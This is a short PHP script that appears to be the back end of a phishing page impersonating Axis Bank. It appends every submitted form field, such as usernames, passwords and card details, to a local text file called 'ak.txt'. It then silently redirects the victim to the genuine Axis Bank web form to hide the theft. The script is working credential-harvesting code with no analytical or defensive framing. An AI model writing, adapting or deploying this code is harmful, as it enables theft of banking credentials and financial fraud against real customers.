<?php
header ('Location: https://clctab.axisbank.co.in/DigitalChannel/WebForm');
$handle = fopen("ak.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>